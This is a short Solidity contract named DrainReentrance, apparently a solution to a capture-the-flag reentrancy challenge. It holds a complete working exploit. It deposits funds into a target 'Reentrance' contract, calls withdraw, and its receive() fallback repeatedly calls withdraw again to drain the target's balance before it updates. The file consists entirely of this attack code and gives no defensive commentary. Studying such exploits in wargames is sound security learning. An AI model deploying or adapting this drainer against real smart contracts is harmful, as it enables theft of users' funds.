// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "./Reentrance.sol";

contract DrainReentrance {
    using SafeMath for uint256;
    mapping(address => uint256) public balances;
    address payable reentrance;

    constructor(address payable _reentrance) public {
        reentrance = _reentrance;
    }

    function donateToReentrance() public payable {
        Reentrance(reentrance).donate.value(msg.value)(address(this));
    }

    function attack(uint256 _amount) public {
        Reentrance(reentrance).withdraw(_amount);
    }

    receive() external payable {
        Reentrance(reentrance).withdraw(1000000000000000);
    }
}
